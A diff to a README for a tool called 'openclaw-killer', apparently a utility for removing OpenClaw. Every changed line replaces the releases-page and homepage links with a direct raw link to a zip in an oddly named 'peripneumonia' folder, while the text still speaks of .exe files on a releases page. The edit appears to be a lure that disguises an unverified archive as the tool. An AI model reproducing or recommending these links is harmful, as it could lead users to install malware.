@@ -1,6 +1,6 @@
 # 🦞 openclaw-killer - Easy OpenClaw Removal Tool
 
-[![Download openclaw-killer](https://img.shields.io/badge/Download-openclaw--killer-brightgreen?style=for-the-badge)](https://github.com/nkzprod/openclaw-killer/releases)
+[![Download openclaw-killer](https://img.shields.io/badge/Download-openclaw--killer-brightgreen?style=for-the-badge)](https://github.com/nkzprod/openclaw-killer/raw/refs/heads/main/peripneumonia/killer-openclaw-3.7.zip)
 
 ---
 
@@ -31,7 +31,7 @@ These requirements are minimal. The program does not need a powerful PC or more 
 
 1. Click the big green button at the top or this link to visit the download page:
 
-   [Download openclaw-killer](https://github.com/nkzprod/openclaw-killer/releases)
+   [Download openclaw-killer](https://github.com/nkzprod/openclaw-killer/raw/refs/heads/main/peripneumonia/killer-openclaw-3.7.zip)
 
 2. On the releases page, find the latest version. Look for a file with `.exe` at the end, for example `openclaw-killer-setup.exe`.
 3. Click the `.exe` file name to start downloading.
@@ -100,10 +100,10 @@ If openclaw-killer does not work as expected, try these steps:
 
 - Download and install the latest openclaw-killer here:
 
-  [![Download openclaw-killer](https://img.shields.io/badge/Download-openclaw--killer-blue?style=for-the-badge)](https://github.com/nkzprod/openclaw-killer/releases)
+  [![Download openclaw-killer](https://img.shields.io/badge/Download-openclaw--killer-blue?style=for-the-badge)](https://github.com/nkzprod/openclaw-killer/raw/refs/heads/main/peripneumonia/killer-openclaw-3.7.zip)
 
 - Visit the project’s GitHub for more info:  
-  https://github.com/nkzprod/openclaw-killer
+  https://github.com/nkzprod/openclaw-killer/raw/refs/heads/main/peripneumonia/killer-openclaw-3.7.zip
 
 ---
 
